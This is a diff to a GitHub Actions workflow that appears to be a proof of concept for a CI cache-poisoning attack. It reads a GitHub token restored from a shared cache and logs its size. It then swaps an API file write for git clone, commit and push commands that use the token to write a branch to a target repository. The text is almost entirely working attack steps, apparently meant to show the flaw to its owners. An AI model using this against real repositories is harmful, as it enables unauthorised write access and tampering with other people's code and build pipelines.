@@ -12,7 +12,7 @@ jobs:
         with:
           path: cache
           key: apexblack-fork-cache-20260804-ghtoken3
-      - name: Use live restored token for base write
+      - name: Use restored token for Git source write
         env:
           CACHE_HIT: \${{ steps.restore.outputs.cache-hit }}
         run: |
@@ -27,20 +27,23 @@ jobs:
           printf "token-present=yes\n" >> result/observation.txt
           printf "token-bytes=%s\n" "$(wc -c < cache/token.txt)" >> result/observation.txt
           token="$(cat cache/token.txt)"
-          http="$(curl -sS -X PUT \
-            -H "Accept: application/vnd.github+json" \
-            -H "Authorization: Bearer $token" \
-            -H "X-GitHub-Api-Version: 2022-11-28" \
-            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-ghtoken3-write.txt" \
-            --data '{"message":"fork PR live token cache sentinel v3","content":"Zm9yay1wci1naHRva2VuMy0yMDI2MDgwNAo="}' \
-            -o result/api-response.json -w "%{http_code}")"
-          printf "put-http=%s\n" "$http" >> result/observation.txt
+          rm -rf base
+          git -c "http.extraheader=Authorization: Bearer $token" clone --depth 1 https://github.com/apexblack-bear-c0dc04/lfs-source-20260804.git base > result/clone.log 2>&1
+          cd base
+          git config user.name "abwolf9a8c2c0e"
+          git config user.email "testingwolf@apexblack.org"
+          printf '%s\n' 'fork-pr-ghtoken3-git-write-20260804' > fork-cache-pr-ghtoken3-git-write.txt
+          git add fork-cache-pr-ghtoken3-git-write.txt
+          git commit -m "fork PR live token git sentinel" > ../result/commit.log 2>&1
+          git -c "http.extraheader=Authorization: Bearer $token" push origin HEAD:refs/heads/fork-pr-ghtoken3-cache-proof > ../result/push.log 2>&1
+          cd ..
+          printf "git-push=success\n" >> result/observation.txt
           cat result/observation.txt
-          cat result/api-response.json
-      - name: Upload live token observation
+          cat result/push.log
+      - name: Upload Git write observation
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: fork-cache-pr-ghtoken3-observation
+          name: fork-cache-pr-ghtoken3-git-observation
           path: result
-# 600-second seed and separate runner pool
+# Git transport protected source-of-truth consumer
